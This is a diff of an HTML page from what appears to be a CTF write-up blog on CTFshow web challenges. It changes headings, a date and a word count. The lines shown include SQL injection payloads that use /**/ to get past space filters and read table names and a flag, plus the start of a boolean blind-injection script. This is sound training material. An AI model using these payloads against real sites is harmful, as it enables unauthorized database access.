@@ -5,9 +5,9 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="CTFshow_web, 0x00dream&#39;s blog">
-    <meta name="description" content="web7:联合查询注入过滤空格将空格换为%09或/**/来绕过
+    <meta name="description" content="web7:联合查询注入过滤空格(考点：联合查询注入绕过)将空格换为%09或/**/来绕过
 获取表名payload
-id=-1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/informat">
+id=-1/**/union/**/select/**/1,group_concat(table_name),3/**/fro">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -435,7 +435,7 @@ id=-1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/informat">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-12-05
+                    2025-04-24
                 </div>
                 
 
@@ -467,7 +467,7 @@ id=-1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/informat">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="web7-联合查询注入过滤空格"><a href="#web7-联合查询注入过滤空格" class="headerlink" title="web7:联合查询注入过滤空格"></a>web7:联合查询注入过滤空格</h2><p>将空格换为%09或<code>/**/</code>来绕过</p>
+                <h2 id="web7-联合查询注入过滤空格-考点：联合查询注入绕过"><a href="#web7-联合查询注入过滤空格-考点：联合查询注入绕过" class="headerlink" title="web7:联合查询注入过滤空格(考点：联合查询注入绕过)"></a>web7:联合查询注入过滤空格(考点：联合查询注入绕过)</h2><p>将空格换为%09或<code>/**/</code>来绕过</p>
 <p>获取表名payload</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">id</span><span class="token operator">=</span>-1/**/union/**/select/**/1,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>,3/**/from/**/information_schema.tables/**/where/**/table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -478,7 +478,7 @@ id=-1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/informat">
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">id</span><span class="token operator">=</span>-1/**/union/**/select/**/1,group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>,3/**/from/**/web7.flag
 ctfshow<span class="token punctuation">{</span>e3588acc-a317-455c-8d41-c80827f1588b<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h2 id="web8-过滤union和空格"><a href="#web8-过滤union和空格" class="headerlink" title="web8:过滤union和空格"></a>web8:过滤union和空格</h2><p>于是通过盲注的方法</p>
+<h2 id="web8-过滤union和空格-考点：布尔盲注"><a href="#web8-过滤union和空格-考点：布尔盲注" class="headerlink" title="web8:过滤union和空格(考点：布尔盲注)"></a>web8:过滤union和空格(考点：布尔盲注)</h2><p>于是通过盲注的方法</p>
 <p>写一个布尔盲注脚本</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
 <span class="token keyword">import</span> threading
@@ -1161,7 +1161,7 @@ url<span class="token operator">=</span><span class="token string">'http://bc679
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">32.9k</span>
+                        class="white-color">46.7k</span>
             
             
             
